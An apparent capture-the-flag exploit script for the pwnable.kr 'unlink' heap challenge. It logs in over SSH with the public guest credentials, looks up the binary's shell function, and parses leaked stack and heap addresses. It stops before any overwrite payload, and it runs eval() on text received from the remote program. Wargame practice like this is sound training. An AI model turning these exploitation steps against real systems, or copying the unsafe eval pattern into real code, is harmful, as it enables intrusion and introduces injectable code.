from pwn import *

shell = ssh(
    'unlink', 'pwnable.kr', 
    password='guest',
    port=2222
)
# shell.download_file('./unlink')
sh = shell.process('./unlink')

e = ELF('./unlink')
shell_addr = e.symbols['shell']
log.info('shell_addr : ' + hex(shell_addr))

sh.recvuntil(': ')
stack_addr = eval(sh.recvline())
log.info('stack_addr : ' + hex(stack_addr))

sh.recvuntil(': ')
heap_addr = eval(sh.recvline())
log.info('heap_addr : ' + hex(heap_addr))

sh.recv()
